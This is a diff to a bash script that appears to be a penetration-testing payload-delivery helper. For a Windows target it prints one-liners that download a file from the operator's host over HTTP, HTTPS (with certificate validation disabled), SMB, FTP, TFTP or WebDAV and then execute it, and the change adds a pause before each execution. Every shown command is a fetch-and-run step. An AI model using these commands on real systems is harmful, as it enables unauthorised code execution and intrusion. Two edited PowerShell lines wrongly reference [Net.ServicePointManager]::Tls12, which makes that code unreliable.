@@ -296,34 +296,34 @@ else
     elif [[ "$TARGET_OS" == "Windows" ]]; then
       if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (HTTP):${NC}"
-        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\" && .\\\"$f\""
-        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
-        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
+        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\" && timeout /t 2 >nul && .\\\"$f\""
+        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && timeout /t 2 >nul && .\\\"$f\""
+        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'; Start-Sleep -s 2; .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (HTTPS - insecure):${NC}"
-        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
+        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && timeout /t 2 >nul && .\\\"$f\""
         # We use single quotes for echo to prevent bash expansion of $true, and double quotes for PowerShell -Command
-        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f'); .\\'$f'\""
-        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f'); Start-Sleep -s 2; .\\'$f'\""
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'; Start-Sleep -s 2; .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (SMB):${NC}"
-        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && .\\$f\""
+        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && timeout /t 2 >nul && .\\$f\""
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (FTP):${NC}"
-        echo "    curl.exe \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
-        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP:$FTP_PORT/$url_encoded', '$f'); .\\'$f'\""
+        echo "    curl.exe \"ftp://$LOCAL_IP:$FTP_PORT/$url_encoded\" -o \"$f\" && timeout /t 2 >nul && .\\\"$f\""
+        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP:$FTP_PORT/$url_encoded', '$f'); Start-Sleep -s 2; .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (TFTP):${NC}"
-        echo "    tftp -i $LOCAL_IP GET \"$f\" && .\\\"$f\""
+        echo "    tftp -i $LOCAL_IP GET \"$f\" && timeout /t 2 >nul && .\\\"$f\""
       fi
       if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo -e "  ${BLUE}Windows (WebDAV):${NC}"
         echo "    (If service error: net start webclient)"
-        echo "    cmd.exe /c \"copy \\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f . && .\\$f\""
+        echo "    cmd.exe /c \"copy \\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f . && timeout /t 2 >nul && .\\$f\""
         echo "    net use Z: \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\""
       fi
       if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
